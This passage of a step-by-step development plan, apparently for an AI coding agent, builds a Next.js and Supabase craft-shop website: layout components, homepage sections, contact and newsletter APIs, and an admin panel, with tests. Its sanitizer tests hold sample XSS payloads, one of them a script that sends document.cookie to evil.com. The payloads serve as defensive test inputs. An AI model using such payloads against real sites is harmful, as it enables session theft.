    <html lang="en" data-theme={theme}>
      <body>
        <a href="#main-content" className="skip-link">Skip to main content</a>
        {settings.announcement_enabled && announcementText && (
          <AnnouncementBanner
            text={announcementText}
            linkUrl={settings.announcement_link_url}
            linkLabel={settings.announcement_link_label}
          />
        )}
        <Header logoUrl={settings.logo_url} />
        <main id="main-content">{children}</main>
        <Footer settings={settings} />
        <Analytics />
        <SpeedInsights />
      </body>
    </html>
  )
}
```

- [ ] **Step 3: Commit**
```bash
git add app/globals.css app/layout.tsx
git commit -m "feat: design system with dual themes, typography, and accessible base styles"
```

---

## Phase 3: Layout Components

### Task 6: Header, Footer, AnnouncementBanner, UI primitives

**Files:**
- Create: `components/layout/AnnouncementBanner.tsx`
- Create: `components/layout/Header.tsx`
- Create: `components/layout/Footer.tsx`
- Create: `components/ui/Button.tsx`
- Create: `components/ui/FormField.tsx`

- [ ] **Step 1: Write test for AnnouncementBanner**

Create `__tests__/components/layout/AnnouncementBanner.test.tsx`:
```typescript
import { render, screen, fireEvent } from '@testing-library/react'
import AnnouncementBanner from '@/components/layout/AnnouncementBanner'

describe('AnnouncementBanner', () => {
  it('renders announcement text', () => {
    render(<AnnouncementBanner text="Come find us at the fair!" linkUrl={null} linkLabel={null} />)
    expect(screen.getByText('Come find us at the fair!')).toBeInTheDocument()
  })
  it('has correct ARIA role', () => {
    render(<AnnouncementBanner text="Hello" linkUrl={null} linkLabel={null} />)
    expect(screen.getByRole('banner')).toBeInTheDocument()
  })
  it('dismisses when button clicked', () => {
    render(<AnnouncementBanner text="Hello" linkUrl={null} linkLabel={null} />)
    fireEvent.click(screen.getByRole('button', { name: /dismiss/i }))
    expect(screen.queryByText('Hello')).not.toBeInTheDocument()
  })
  it('renders link with noopener rel when provided', () => {
    render(<AnnouncementBanner text="Event" linkUrl="https://example.com" linkLabel="Learn more" />)
    const link = screen.getByRole('link', { name: 'Learn more' })
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  })
  it('does not render link for non-https URL', () => {
    render(<AnnouncementBanner text="Event" linkUrl="javascript:alert(1)" linkLabel="Click" />)
    expect(screen.queryByRole('link')).not.toBeInTheDocument()
  })
})
```

- [ ] **Step 2: Run test — expect FAIL**
```bash
npm test -- --testPathPattern=AnnouncementBanner
```

- [ ] **Step 3: Create `components/layout/AnnouncementBanner.tsx`**
```typescript
'use client'
import { useState, useEffect } from 'react'
import { isValidHttpsUrl } from '@/lib/validate'

interface Props { text: string; linkUrl: string | null; linkLabel: string | null }

export default function AnnouncementBanner({ text, linkUrl, linkLabel }: Props) {
  const [visible, setVisible] = useState(false)
  useEffect(() => {
    if (!sessionStorage.getItem('announcement-dismissed')) setVisible(true)
  }, [])

  function dismiss() {
    sessionStorage.setItem('announcement-dismissed', '1')
    setVisible(false)
  }

  if (!visible) return null

  const safeLink = linkUrl && isValidHttpsUrl(linkUrl) ? linkUrl : null

  return (
    <div role="banner" aria-label="Announcement" style={{ background: 'var(--color-primary)', color: 'var(--color-accent)', padding: '10px 20px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '12px', fontSize: '16px', position: 'relative' }}>
      <span>{text}</span>
      {safeLink && (
        <a href={safeLink} target="_blank" rel="noopener noreferrer" style={{ color: 'var(--color-accent)', textDecoration: 'underline' }}>
          {linkLabel ?? 'Learn more'}
        </a>
      )}
      <button onClick={dismiss} aria-label="Dismiss announcement" style={{ position: 'absolute', right: '16px', background: 'none', border: 'none', color: 'var(--color-accent)', fontSize: '20px', cursor: 'pointer', padding: '8px', minWidth: '48px', minHeight: '48px' }}>
        ×
      </button>
    </div>
  )
}
```

- [ ] **Step 4: Run test — expect PASS**
```bash
npm test -- --testPathPattern=AnnouncementBanner
```

- [ ] **Step 5: Create `components/ui/Button.tsx`**
```typescript
interface ButtonProps extends React.ButtonHTMLAttributes<HTMLButtonElement> {
  variant?: 'primary' | 'secondary' | 'danger'
  children: React.ReactNode
}

export default function Button({ variant = 'primary', children, style, ...props }: ButtonProps) {
  const variantStyles: Record<string, React.CSSProperties> = {
    primary: { background: 'var(--color-primary)', color: 'var(--color-accent)', border: 'none' },
    secondary: { background: 'transparent', color: 'var(--color-primary)', border: '2px solid var(--color-primary)' },
    danger: { background: '#c05050', color: '#fff', border: 'none' },
  }
  return (
    <button {...props} style={{ ...variantStyles[variant], padding: '12px 24px', fontSize: '18px', borderRadius: '4px', cursor: 'pointer', minHeight: '48px', fontFamily: 'var(--font-body)', ...style }}>
      {children}
    </button>
  )
}
```

- [ ] **Step 6: Create `components/ui/FormField.tsx`**
```typescript
interface FormFieldProps { label: string; id: string; error?: string; required?: boolean; children: React.ReactNode }

export default function FormField({ label, id, error, required, children }: FormFieldProps) {
  return (
    <div style={{ marginBottom: '20px' }}>
      <label htmlFor={id} style={{ display: 'block', marginBottom: '6px', fontWeight: '500', fontSize: '18px' }}>
        {label}{required && <span aria-hidden="true" style={{ color: '#c05050' }}> *</span>}
        {required && <span className="sr-only"> (required)</span>}
      </label>
      {children}
      {error && (
        <p id={`${id}-error`} role="alert" aria-live="polite" style={{ color: '#c05050', marginTop: '4px', fontSize: '16px' }}>
          {error}
        </p>
      )}
    </div>
  )
}
```

- [ ] **Step 7: Create `components/layout/Header.tsx`**
```typescript
import Link from 'next/link'
import Image from 'next/image'

interface Props { logoUrl: string | null }

export default function Header({ logoUrl }: Props) {
  return (
    <header style={{ background: 'var(--color-surface)', borderBottom: '1px solid var(--color-border)', position: 'sticky', top: 0, zIndex: 100 }}>
      <nav aria-label="Main navigation" style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 24px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', height: '72px' }}>
        <Link href="/" aria-label="Purple Acorns Creations — home">
          {logoUrl
            ? <Image src={logoUrl} alt="Purple Acorns Creations" height={48} width={160} style={{ objectFit: 'contain' }} />
            : <span style={{ fontFamily: 'var(--font-display)', fontSize: '22px', color: 'var(--color-primary)' }}>Purple Acorns Creations</span>
          }
        </Link>
        <ul style={{ listStyle: 'none', display: 'flex', gap: '32px', alignItems: 'center' }}>
          {[{ href: '/shop', label: 'Shop' }, { href: '/our-story', label: 'Our Story' }, { href: '/#events', label: 'Events' }, { href: '/#contact', label: 'Contact' }].map(({ href, label }) => (
            <li key={href}>
              <Link href={href} style={{ color: 'var(--color-text)', textDecoration: 'none', fontSize: '18px', fontWeight: '500' }}>
                {label}
              </Link>
            </li>
          ))}
        </ul>
      </nav>
    </header>
  )
}
```

- [ ] **Step 8: Create `components/layout/Footer.tsx`** — social links use `isValidHttpsUrl`, only render links that pass validation. Footer also contains the custom order inquiry contact form (name, email, message) that posts to `/api/contact`. Required consent text: "By submitting this form you agree to our Privacy Policy."
```typescript
import Link from 'next/link'
import type { Settings } from '@/lib/supabase/types'
import { isValidHttpsUrl } from '@/lib/validate'

interface Props { settings: Settings }

type SocialDef = { key: keyof Settings; label: string; buildUrl: (val: string) => string }

const SOCIALS: SocialDef[] = [
  { key: 'social_instagram', label: 'Instagram', buildUrl: (h) => `https://instagram.com/${h}` },
  { key: 'social_facebook', label: 'Facebook', buildUrl: (u) => u },
  { key: 'social_tiktok', label: 'TikTok', buildUrl: (h) => `https://tiktok.com/@${h}` },
  { key: 'social_pinterest', label: 'Pinterest', buildUrl: (h) => `https://pinterest.com/${h}` },
  { key: 'social_x', label: 'X', buildUrl: (h) => `https://x.com/${h}` },
]

export default function Footer({ settings }: Props) {
  const year = new Date().getFullYear()
  return (
    <footer id="contact" style={{ background: 'var(--color-primary)', color: 'var(--color-bg)', padding: '48px 24px' }}>
      <div style={{ maxWidth: '1200px', margin: '0 auto', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '48px' }}>
        <div>
          <h2 style={{ fontFamily: 'var(--font-display)', color: 'var(--color-accent)', marginBottom: '24px', fontSize: '28px' }}>
            Get in Touch
          </h2>
          <ContactForm />
        </div>
        <div>
          <div style={{ display: 'flex', gap: '16px', flexWrap: 'wrap', marginBottom: '24px' }}>
            {SOCIALS.map(({ key, label, buildUrl }) => {
              const val = settings[key] as string | null
              if (!val) return null
              const href = buildUrl(val)
              if (!isValidHttpsUrl(href)) return null
              return (
                <a key={key} href={href} target="_blank" rel="noopener noreferrer" style={{ color: 'var(--color-accent)', fontSize: '18px' }}>
                  {label}
                </a>
              )
            })}
          </div>
          <p style={{ fontSize: '16px', color: 'rgba(255,255,255,0.5)', marginTop: '16px' }}>
            © {year} Purple Acorns Creations ·{' '}
            <Link href="/privacy" style={{ color: 'rgba(255,255,255,0.5)' }}>Privacy Policy</Link> ·{' '}
            <Link href="/terms" style={{ color: 'rgba(255,255,255,0.5)' }}>Terms of Service</Link>
          </p>
        </div>
      </div>
    </footer>
  )
}

// Inline client component for the contact form
'use client'
function ContactForm() {
  const [status, setStatus] = React.useState<'idle' | 'loading' | 'success' | 'error'>('idle')
  const [error, setError] = React.useState('')

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault()
    setStatus('loading')
    setError('')
    const form = e.currentTarget
    const data = {
      name: (form.elements.namedItem('name') as HTMLInputElement).value.trim(),
      email: (form.elements.namedItem('email') as HTMLInputElement).value.trim(),
      message: (form.elements.namedItem('message') as HTMLTextAreaElement).value.trim(),
    }
    const res = await fetch('/api/contact', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
    if (res.ok) { setStatus('success'); form.reset() }
    else { const d = await res.json(); setError(d.error ?? 'Something went wrong.'); setStatus('error') }
  }

  if (status === 'success') {
    return <p role="status" aria-live="polite" style={{ color: 'var(--color-accent)', fontSize: '18px' }}>Thank you! We'll be in touch soon.</p>
  }

  return (
    <form onSubmit={handleSubmit} noValidate>
      <div style={{ marginBottom: '16px' }}>
        <label htmlFor="contact-name" style={{ display: 'block', marginBottom: '4px', color: 'rgba(255,255,255,0.8)', fontSize: '16px' }}>Name *</label>
        <input id="contact-name" name="name" required maxLength={100} style={{ width: '100%', padding: '10px', fontSize: '18px', borderRadius: '4px', border: '1px solid rgba(255,255,255,0.3)', background: 'rgba(255,255,255,0.1)', color: '#fff' }} />
      </div>
      <div style={{ marginBottom: '16px' }}>
        <label htmlFor="contact-email" style={{ display: 'block', marginBottom: '4px', color: 'rgba(255,255,255,0.8)', fontSize: '16px' }}>Email *</label>
        <input id="contact-email" name="email" type="email" required maxLength={254} style={{ width: '100%', padding: '10px', fontSize: '18px', borderRadius: '4px', border: '1px solid rgba(255,255,255,0.3)', background: 'rgba(255,255,255,0.1)', color: '#fff' }} />
      </div>
      <div style={{ marginBottom: '16px' }}>
        <label htmlFor="contact-message" style={{ display: 'block', marginBottom: '4px', color: 'rgba(255,255,255,0.8)', fontSize: '16px' }}>Message *</label>
        <textarea id="contact-message" name="message" required maxLength={2000} rows={4} style={{ width: '100%', padding: '10px', fontSize: '18px', borderRadius: '4px', border: '1px solid rgba(255,255,255,0.3)', background: 'rgba(255,255,255,0.1)', color: '#fff', resize: 'vertical' }} />
      </div>
      {error && <p role="alert" aria-live="polite" style={{ color: '#ffb3b3', marginBottom: '12px', fontSize: '16px' }}>{error}</p>}
      <p style={{ color: 'rgba(255,255,255,0.5)', fontSize: '14px', marginBottom: '12px' }}>
        By submitting this form you agree to our <Link href="/privacy" style={{ color: 'rgba(255,255,255,0.6)', textDecoration: 'underline' }}>Privacy Policy</Link>.
      </p>
      <button type="submit" disabled={status === 'loading'} style={{ background: 'var(--color-accent)', color: 'var(--color-primary)', padding: '12px 28px', fontSize: '18px', border: 'none', borderRadius: '4px', cursor: 'pointer', minHeight: '48px', fontWeight: '600' }}>
        {status === 'loading' ? 'Sending…' : 'Send Message'}
      </button>
    </form>
  )
}
```

- [ ] **Step 9: Run all tests**
```bash
npm test
```
Expected: All PASS

- [ ] **Step 10: Commit**
```bash
git add components/ __tests__/components/
git commit -m "feat: layout components with secure link validation and accessible UI primitives"
```

---

## Phase 4: Public Pages

### Task 7: Homepage sections

**Files:**
- Create: `app/page.tsx`, and all 7 `components/home/*.tsx` files

- [ ] **Step 1: Write test for HeroSection**

Create `__tests__/components/home/HeroSection.test.tsx`:
```typescript
import { render, screen } from '@testing-library/react'
import HeroSection from '@/components/home/HeroSection'

describe('HeroSection', () => {
  it('renders tagline as h1', () => {
    render(<HeroSection tagline="Handcrafted with love" subtext="Brooklyn NY" />)
    expect(screen.getByRole('heading', { level: 1 })).toHaveTextContent('Handcrafted with love')
  })
  it('has Shop Now and Our Story links', () => {
    render(<HeroSection tagline="Test" subtext="Test" />)
    expect(screen.getByRole('link', { name: /shop now/i })).toBeInTheDocument()
    expect(screen.getByRole('link', { name: /our story/i })).toBeInTheDocument()
  })
})
```

- [ ] **Step 2: Run test — expect FAIL, then implement `components/home/HeroSection.tsx`, re-run — expect PASS**

HeroSection renders: `<section>` with full-viewport height, `<h1>` tagline, `<p>` subtext, two `<Link>` CTAs (Shop Now → `/shop`, Our Story → `/our-story`).

- [ ] **Step 3a: Write test → run FAIL → implement `StoryTeaser` → run PASS**

Test: renders `<h2>Our Story</h2>`, teaser text, link to `/our-story`.
Implement: `components/home/StoryTeaser.tsx` — `<section>`, `<h2>Our Story</h2>`, `<p>` teaser in italics, `<Link href="/our-story">Read Full Story →</Link>`.
```bash
npm test -- --testPathPattern=StoryTeaser
```

- [ ] **Step 3b: Write test → run FAIL → implement `FeaturedPieces` → run PASS**

Test: renders product name and price as `$XX.XX`, renders "View All" link to `/shop`, renders nothing if products array is empty.
Implement: `components/home/FeaturedPieces.tsx` — `<section>`, `<h2>Featured Pieces</h2>`, CSS grid of `<article>` elements. Each: `<Image>` (alt = product name), name, optional description, price formatted as `$${price.toFixed(2)}`, optional Square link. "View All →" link to `/shop`.
```bash
npm test -- --testPathPattern=FeaturedPieces
```

- [ ] **Step 3c: Write test → run FAIL → implement `GalleryStrip` → run PASS**

Test: renders a list element for each gallery item, each image has its alt text.
Implement: `components/home/GalleryStrip.tsx` — `<section>` with `role="list"`, horizontally scrollable container, `<Image>` items with `alt_text` from DB. Hides from screen readers if empty.
```bash
npm test -- --testPathPattern=GalleryStrip
```

- [ ] **Step 3d: Write test → run FAIL → implement `NextEvent` → run PASS**

Test: renders event name and location, renders nothing when event is null, renders optional link button when link_url set.
Implement: `components/home/NextEvent.tsx` — `<section id="events">`. If event is null returns null. Renders name, formatted date, location as Google Maps search link, optional description, optional link button. Maps link validated via `isValidHttpsUrl`.
```bash
npm test -- --testPathPattern=NextEvent
```

- [ ] **Step 3e: Write test → run FAIL → implement `InstagramFeed` → run PASS**

Test: renders fallback Instagram link when widgetId is null, renders Behold widget div when widgetId is set.
Implement: `components/home/InstagramFeed.tsx` — if `widgetId` is set, render `<div className="behold-widget">` and lazy-load the Behold script. Fallback: plain `<a href="https://instagram.com/${handle}">` link.
```bash
npm test -- --testPathPattern=InstagramFeed
```

- [ ] **Step 3f: Write test → run FAIL → implement `NewsletterSignup` → run PASS**

Test: renders email input, submit button, shows success message after successful fetch, shows error message on failure.
Implement: `components/home/NewsletterSignup.tsx` — `'use client'`. Email input → `POST /api/newsletter/subscribe`. `aria-live="polite"` for status messages. Consent text: "By subscribing you agree to our Privacy Policy." Email validated client-side before submit.
```bash
npm test -- --testPathPattern=NewsletterSignup
```

- [ ] **Step 4: Run all home component tests**
```bash
npm test -- --testPathPattern=home
```
Expected: All PASS

- [ ] **Step 5: Create `app/page.tsx`**
```typescript
import { createServiceRoleClient } from '@/lib/supabase/server'
import { getAllContent } from '@/lib/content'
import { getSettings } from '@/lib/theme'
import HeroSection from '@/components/home/HeroSection'
import StoryTeaser from '@/components/home/StoryTeaser'
import FeaturedPieces from '@/components/home/FeaturedPieces'
import GalleryStrip from '@/components/home/GalleryStrip'
import NextEvent from '@/components/home/NextEvent'
import InstagramFeed from '@/components/home/InstagramFeed'
import NewsletterSignup from '@/components/home/NewsletterSignup'

export default async function HomePage() {
  const supabase = createServiceRoleClient()
  const today = new Date().toISOString().split('T')[0]

  const [content, settings, products, gallery, { data: event }] = await Promise.all([
    getAllContent(),
    getSettings(),
    supabase.from('featured_products').select('*').eq('is_active', true).order('sort_order').then(r => r.data ?? []),
    supabase.from('gallery').select('*').order('sort_order').limit(8).then(r => r.data ?? []),
    supabase.from('events').select('*').gte('date', today).order('date').limit(1).single(),
  ])

  return (
    <>
      <HeroSection tagline={content.hero_tagline} subtext={content.hero_subtext} />
      <StoryTeaser teaser={content.story_teaser} />
      <FeaturedPieces products={products} />
      <GalleryStrip items={gallery} />
      <NextEvent event={event} />
      <InstagramFeed widgetId={settings.behold_widget_id} handle={settings.social_instagram} />
      <NewsletterSignup />
    </>
  )
}
```

- [ ] **Step 6: Commit**
```bash
git add app/page.tsx components/home/ __tests__/components/home/
git commit -m "feat: homepage with all 7 sections, secure links, accessible markup"
```

---

### Task 8: Remaining public pages, newsletter API, and contact API

**Files:**
- Create: `app/shop/page.tsx`, `app/our-story/page.tsx`, `app/privacy/page.tsx`, `app/terms/page.tsx`
- Create: `app/api/newsletter/subscribe/route.ts`
- Create: `app/api/contact/route.ts`

- [ ] **Step 1: Create public pages — all use `sanitizeContent` before rendering HTML**

`app/our-story/page.tsx`:
```typescript
import { getContent } from '@/lib/content'
import { sanitizeContent } from '@/lib/sanitize'

export const metadata = { title: 'Our Story' }

export default async function OurStoryPage() {
  const raw = await getContent('story_full')
  const html = sanitizeContent(raw)
  return (
    <article style={{ maxWidth: '760px', margin: '0 auto', padding: '80px 24px' }}>
      <h1 style={{ color: 'var(--color-primary)', marginBottom: '48px', textAlign: 'center' }}>Our Story</h1>
      <div
        style={{ fontSize: '20px', lineHeight: 1.9, color: 'var(--color-text)' }}
        dangerouslySetInnerHTML={{ __html: html }}
      />
    </article>
  )
}
```

Same pattern for `app/privacy/page.tsx` (key: `privacy_policy`) and `app/terms/page.tsx` (key: `terms_of_service`).

`app/shop/page.tsx` — reads `square_store_url` from settings. Renders `<iframe>` if set (no HTML content, no sanitizer needed), otherwise a placeholder message.

- [ ] **Step 2: Write test verifying sanitizer is used on content pages**

Create `__tests__/lib/sanitize-integration.test.ts`:
```typescript
import { sanitizeContent } from '@/lib/sanitize'

describe('Content page sanitization', () => {
  it('strips script tags that could appear in DB content', () => {
    const unsafe = '<p>Story</p><script>fetch("https://evil.com?c="+document.cookie)</script>'
    const safe = sanitizeContent(unsafe)
    expect(safe).not.toContain('<script>')
    expect(safe).toContain('<p>Story</p>')
  })
  it('strips img onerror XSS', () => {
    const unsafe = '<img src="x" onerror="alert(1)">'
    const safe = sanitizeContent(unsafe)
    expect(safe).not.toContain('onerror')
  })
})
```

```bash
npm test -- --testPathPattern=sanitize-integration
```
Expected: PASS

- [ ] **Step 3: Create newsletter subscribe API `app/api/newsletter/subscribe/route.ts`**
```typescript
import { NextResponse } from 'next/server'
import { createServiceRoleClient } from '@/lib/supabase/server'
import { isValidEmail } from '@/lib/validate'

// Simple in-memory rate limiter: 1 request per IP per 60 seconds
const rateLimitMap = new Map<string, number>()

export async function POST(request: Request) {
  // Rate limiting
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ?? 'unknown'
  const now = Date.now()
  const last = rateLimitMap.get(ip) ?? 0
  if (now - last < 60_000) {
    return NextResponse.json({ error: 'Too many requests. Please wait a minute.' }, { status: 429 })
  }
  rateLimitMap.set(ip, now)

  const body = await request.json().catch(() => ({}))
  const email = (body.email ?? '').toString().trim().toLowerCase()

  if (!isValidEmail(email)) {
    return NextResponse.json({ error: 'Please enter a valid email address.' }, { status: 400 })
  }

  const supabase = createServiceRoleClient()
  const { data: settings } = await supabase
    .from('settings')
    .select('mailchimp_api_key, mailchimp_audience_id')
    .single()

  if (!settings?.mailchimp_api_key || !settings?.mailchimp_audience_id) {
    return NextResponse.json({ error: 'Newsletter not configured yet.' }, { status: 503 })
  }

  const dc = settings.mailchimp_api_key.split('-').pop()
  const res = await fetch(
    `https://${dc}.api.mailchimp.com/3.0/lists/${settings.mailchimp_audience_id}/members`,
    {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${settings.mailchimp_api_key}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email_address: email, status: 'pending' }),
    }
  )

  if (res.ok) return NextResponse.json({ success: true })

  const data = await res.json()
  // Mailchimp returns "Member Exists" for already-subscribed emails — treat as success
  if (data.title === 'Member Exists') return NextResponse.json({ success: true })

  return NextResponse.json({ error: 'Could not subscribe. Please try again.' }, { status: 500 })
}
```

- [ ] **Step 4: Write test for newsletter route validation**

Create `__tests__/api/newsletter.test.ts`:
```typescript
import { isValidEmail } from '@/lib/validate'

describe('Newsletter email validation', () => {
  it('accepts valid emails', () => {
    expect(isValidEmail('user@example.com')).toBe(true)
    expect(isValidEmail('user+tag@example.co.uk')).toBe(true)
  })
  it('rejects invalid emails', () => {
    expect(isValidEmail('')).toBe(false)
    expect(isValidEmail('notanemail')).toBe(false)
    expect(isValidEmail('<script>@evil.com')).toBe(false)
  })
})
```

```bash
npm test -- --testPathPattern=newsletter
```
Expected: PASS

- [ ] **Step 5: Create contact API `app/api/contact/route.ts`** — phishing-safe contact form handler

```typescript
import { NextResponse } from 'next/server'
import { isValidEmail, clampLength } from '@/lib/validate'
import { sanitizeText } from '@/lib/sanitize'

// Rate limiter: 1 submission per IP per 60 seconds
const rateLimitMap = new Map<string, number>()

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ?? 'unknown'
  const now = Date.now()
  if ((rateLimitMap.get(ip) ?? 0) + 60_000 > now) {
    return NextResponse.json({ error: 'Too many requests. Please wait a minute.' }, { status: 429 })
  }
  rateLimitMap.set(ip, now)

  const body = await request.json().catch(() => ({}))
  const name = sanitizeText(clampLength(body.name ?? '', 100))
  const email = sanitizeText((body.email ?? '').toString().trim().toLowerCase())
  const message = sanitizeText(clampLength(body.message ?? '', 2000))

  if (!name) return NextResponse.json({ error: 'Name is required.' }, { status: 400 })
  if (!isValidEmail(email)) return NextResponse.json({ error: 'Please enter a valid email address.' }, { status: 400 })
  if (!message) return NextResponse.json({ error: 'Message is required.' }, { status: 400 })

  // Deliver to admin email via Supabase contact_email setting
  // (Server-side only — never auto-reply to prevent spoofing)
  const { createServiceRoleClient } = await import('@/lib/supabase/server')
  const supabase = createServiceRoleClient()
  const { data: settings } = await supabase.from('settings').select('contact_email').single()

  if (!settings?.contact_email) {
    // Silently succeed if no contact email configured (don't expose config state)
    return NextResponse.json({ success: true })
  }

  // In production: use a transactional email service (Resend, Postmark, etc.)
  // For now, log server-side and return success (replace with actual send in production)
  console.log(`[Contact] From: ${name} <${email}> | To: ${settings.contact_email} | Message: ${message}`)

  return NextResponse.json({ success: true })
}
```

- [ ] **Step 6: Write test for contact API validation**

Create `__tests__/api/contact.test.ts`:
```typescript
import { isValidEmail, clampLength } from '@/lib/validate'
import { sanitizeText } from '@/lib/sanitize'

describe('Contact form validation', () => {
  it('rejects empty email', () => expect(isValidEmail('')).toBe(false))
  it('rejects malformed email', () => expect(isValidEmail('notanemail')).toBe(false))
  it('clamps name to 100 chars', () => expect(clampLength('a'.repeat(200), 100).length).toBe(100))
  it('clamps message to 2000 chars', () => expect(clampLength('x'.repeat(3000), 2000).length).toBe(2000))
  it('sanitizes HTML from name field', () => expect(sanitizeText('<script>alert(1)</script>')).toBe(''))
  it('sanitizes HTML from message field', () => expect(sanitizeText('<img onerror="alert(1)">')).toBe(''))
})
```

```bash
npm test -- --testPathPattern=contact
```
Expected: PASS

- [ ] **Step 7: Commit**
```bash
git add app/shop/ app/our-story/ app/privacy/ app/terms/ app/api/newsletter/ app/api/contact/ __tests__/api/ __tests__/lib/sanitize-integration.test.ts
git commit -m "feat: public pages, newsletter API, and rate-limited phishing-safe contact form"
```

---

## Phase 5: Admin Panel

### Task 9: Admin layout + dashboard

**Files:**
- Create: `components/admin/AdminSidebar.tsx`
- Create: `app/admin/layout.tsx`
- Create: `app/admin/page.tsx`
- Create: `app/admin/newsletter/page.tsx` (stub — Plan 2)
- Create: `app/admin/reports/page.tsx` (stub — Plan 2)
- Create: `components/admin/ConfirmDialog.tsx`

- [ ] **Step 1: Write test for ConfirmDialog**

Create `__tests__/components/admin/ConfirmDialog.test.tsx`:
```typescript
import { render, screen, fireEvent } from '@testing-library/react'
import ConfirmDialog from '@/components/admin/ConfirmDialog'

describe('ConfirmDialog', () => {
  it('renders message text', () => {
    render(<ConfirmDialog message="Delete this event?" onConfirm={jest.fn()} onCancel={jest.fn()} />)
    expect(screen.getByText('Delete this event?')).toBeInTheDocument()
  })
  it('has role="dialog" and aria-modal="true"', () => {
    render(<ConfirmDialog message="Delete?" onConfirm={jest.fn()} onCancel={jest.fn()} />)
    expect(screen.getByRole('dialog')).toHaveAttribute('aria-modal', 'true')
  })
  it('calls onConfirm when Delete clicked', () => {
    const onConfirm = jest.fn()
    render(<ConfirmDialog message="Delete?" onConfirm={onConfirm} onCancel={jest.fn()} />)
    fireEvent.click(screen.getByRole('button', { name: /delete/i }))
    expect(onConfirm).toHaveBeenCalled()
  })
  it('calls onCancel when Cancel clicked', () => {
    const onCancel = jest.fn()
    render(<ConfirmDialog message="Delete?" onConfirm={jest.fn()} onCancel={onCancel} />)
    fireEvent.click(screen.getByRole('button', { name: /cancel/i }))
    expect(onCancel).toHaveBeenCalled()
  })
})
```

- [ ] **Step 2: Run test — expect FAIL**
```bash
npm test -- --testPathPattern=ConfirmDialog
```

- [ ] **Step 3: Create `components/admin/ConfirmDialog.tsx`**

Accessible modal: `role="dialog"` `aria-modal="true"` `aria-labelledby` pointing to message. Cancel + Delete/Confirm buttons, both min 48px touch targets. `tabIndex` managed to trap focus.

```typescript
'use client'
interface Props { message: string; onConfirm: () => void; onCancel: () => void }

export default function ConfirmDialog({ message, onConfirm, onCancel }: Props) {
  return (
    <div role="presentation" style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000 }}>
      <div role="dialog" aria-modal="true" aria-labelledby="confirm-msg" style={{ background: '#fff', borderRadius: '8px', padding: '32px', maxWidth: '400px', width: '90%' }}>
        <p id="confirm-msg" style={{ fontSize: '18px', marginBottom: '24px', color: '#1a0f2e' }}>{message}</p>
        <div style={{ display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
          <button onClick={onCancel} style={{ padding: '12px 24px', fontSize: '18px', border: '2px solid #2d1b4e', background: 'transparent', color: '#2d1b4e', borderRadius: '4px', cursor: 'pointer', minHeight: '48px' }}>Cancel</button>
          <button onClick={onConfirm} style={{ padding: '12px 24px', fontSize: '18px', border: 'none', background: '#c05050', color: '#fff', borderRadius: '4px', cursor: 'pointer', minHeight: '48px' }}>Delete</button>
        </div>
      </div>
    </div>
  )
}
```

- [ ] **Step 4: Run test — expect PASS**
```bash
npm test -- --testPathPattern=ConfirmDialog
```

- [ ] **Step 5: Write test for AdminSidebar**

Create `__tests__/components/admin/AdminSidebar.test.tsx`:
```typescript
import { render, screen } from '@testing-library/react'
import AdminSidebar from '@/components/admin/AdminSidebar'
// Mock usePathname
jest.mock('next/navigation', () => ({ usePathname: () => '/admin' }))

describe('AdminSidebar', () => {
  it('renders all main nav items', () => {
    render(<AdminSidebar />)
    expect(screen.getByText(/Dashboard/)).toBeInTheDocument()
    expect(screen.getByText(/Content/)).toBeInTheDocument()
    expect(screen.getByText(/Events/)).toBeInTheDocument()
    expect(screen.getByText(/Gallery/)).toBeInTheDocument()
  })
  it('marks current page with aria-current="page"', () => {
    render(<AdminSidebar />)
    expect(screen.getByRole('link', { name: /Dashboard/ })).toHaveAttribute('aria-current', 'page')
  })
})
```

- [ ] **Step 6: Run test — expect FAIL**
```bash
npm test -- --testPathPattern=AdminSidebar
```

- [ ] **Step 7: Create `components/admin/AdminSidebar.tsx`** — sidebar with nav items (🏠 Dashboard, ✏️ Content, 📅 Events, 🖼 Gallery, 💌 Newsletter, 📊 Reports, 🎨 Branding, 🔗 Integrations), View Live Site link, Sign Out button. Uses `usePathname()` to set `aria-current="page"` on active link.

- [ ] **Step 8: Run test — expect PASS**
```bash
npm test -- --testPathPattern=AdminSidebar
```

- [ ] **Step 9: Create `app/admin/layout.tsx`** — flex row: `<AdminSidebar />` + `<main>` with generous padding.

- [ ] **Step 10: Create `app/admin/page.tsx`** — 4 large quick-action tile links (Add Event, Upload Photo, Edit Content, Manage Branding). Each tile is an accessible `<Link>` with icon, label, and min 48px touch target.

- [ ] **Step 11: Create stub pages for Plan 2 features** — prevents 404 on sidebar navigation

`app/admin/newsletter/page.tsx`:
```typescript
export default function NewsletterAdminPage() {
  return (
    <div style={{ padding: '40px' }}>
      <h1 style={{ fontFamily: 'var(--font-display)', color: 'var(--color-primary)', marginBottom: '16px' }}>Newsletter</h1>
      <p style={{ color: 'var(--color-text-muted)', fontSize: '18px' }}>Newsletter compose and send features are coming in Phase 2.</p>
    </div>
  )
}
```

`app/admin/reports/page.tsx`:
```typescript
export default function ReportsAdminPage() {
  return (
    <div style={{ padding: '40px' }}>
      <h1 style={{ fontFamily: 'var(--font-display)', color: 'var(--color-primary)', marginBottom: '16px' }}>Reports</h1>
      <p style={{ color: 'var(--color-text-muted)', fontSize: '18px' }}>Analytics and AI digest reports are coming in Phase 2.</p>
    </div>
  )
}
```

- [ ] **Step 12: Run all tests**
```bash
npm test
```
Expected: All PASS

- [ ] **Step 13: Commit**
```bash
git add app/admin/ components/admin/ __tests__/components/admin/
git commit -m "feat: admin layout, sidebar with aria-current, dashboard, and Phase 2 stubs"
```

---

### Task 10: Admin API routes (auth-checked)

**Files:**
- Create: `app/api/admin/content/route.ts`
- Create: `app/api/admin/events/route.ts`
- Create: `app/api/admin/gallery/route.ts`
- Create: `app/api/admin/settings/route.ts`

All routes call `requireAdminSession()` first — if it returns an error, return it immediately.

